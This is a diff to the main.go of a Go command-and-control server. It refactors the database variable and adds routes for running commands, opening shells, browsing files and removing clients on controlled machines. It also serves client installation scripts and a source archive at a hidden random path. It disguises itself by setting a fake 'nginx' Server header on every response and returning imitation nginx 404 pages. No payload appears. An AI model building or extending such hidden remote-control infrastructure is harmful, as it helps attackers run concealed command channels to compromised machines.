@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"net/http"
 	"net/url"
 	"os"
 	"strings"
@@ -41,12 +40,11 @@ import (
 func main() {
 	var (
 		conf *config.Type
-		data *database.Type
 		jobs *joblist.Type
+		db   *database.Type
 		c2s  *c2.Type
 		app  *fiber.App
-
-		err error
+		err  error
 	)
 
 	// create the log functions
@@ -61,6 +59,9 @@ func main() {
 		os.Exit(1)
 	}
 
+	// generate a random source archive path
+	conf.SourcePath = fmt.Sprintf("/%s", util.RandomStr(18))
+
 	// check the password configuration
 	if conf.Password == "" {
 		conf.Password = util.RandomStr(13)
@@ -73,7 +74,7 @@ func main() {
 	}
 
 	// load data(base)
-	if data, err = database.New(conf); err != nil {
+	if db, err = database.New(conf); err != nil {
 		log.Fail("failed to load the database: %s", err.Error())
 		os.Exit(1)
 	}
@@ -85,7 +86,7 @@ func main() {
 	}
 
 	// create the C2 server
-	if c2s, err = c2.New(conf, data, jobs); err != nil {
+	if c2s, err = c2.New(conf, db, jobs); err != nil {
 		log.Fail("failed to create the C2 server: %s", err.Error())
 		os.Exit(1)
 	}
@@ -106,8 +107,10 @@ func main() {
 
 	// setup local config
 	app.Use("*", func(c *fiber.Ctx) error {
+		c.Set("Server", "nginx")
+
 		c.Locals("config", conf)
-		c.Locals("database", data)
+		c.Locals("database", db)
 		c.Locals("joblist", jobs)
 		c.Locals("c2", c2s)
 
@@ -132,8 +135,10 @@ func main() {
 	wi.Get("/new", routes.GET_new)
 	wi.Get("/logs", routes.GET_logs)
 	wi.Get("/login", routes.GET_login)
-	wi.Post("/login", routes.POST_login)
 	wi.Get("/logout", routes.GET_logout)
+
+	wi.Post("/new", routes.POST_new)
+	wi.Post("/login", routes.POST_login)
 
 	ci := wi.Group("/c/:cid")
 	ci.Use("*", routes.VerifyClient)
@@ -143,8 +148,8 @@ func main() {
 	ci.Get("/run", routes.GET_run)
 	ci.Get("/shell", routes.GET_shell)
 	ci.Get("/files", routes.GET_files)
+	ci.Get("/remove", routes.GET_remove)
 	ci.Get("/protect", routes.GET_protect)
-	ci.Get("/destruct", routes.GET_destruct)
 
 	ci.Post("/run", routes.POST_run)
 	ci.Post("/shell", routes.POST_shell)
@@ -156,11 +161,12 @@ func main() {
 	}
 	wi.Static("/static", conf.Static)
 
+	app.Get(conf.SourcePath, routes.GET_source) // route for the local source archive
+	app.Get("/:script", routes.GET_script)      // route for obtaning client installation scripts
+
 	// for all the other pages, send a fake nginx 404
 	app.All("*", func(c *fiber.Ctx) error {
-		c.Set("Server", "nginx")
-		c.Status(http.StatusNotFound)
-		return util.Render(c, "notfound")
+		return util.RenderNginxNotFound(c)
 	})
 
 	// start the C2 server
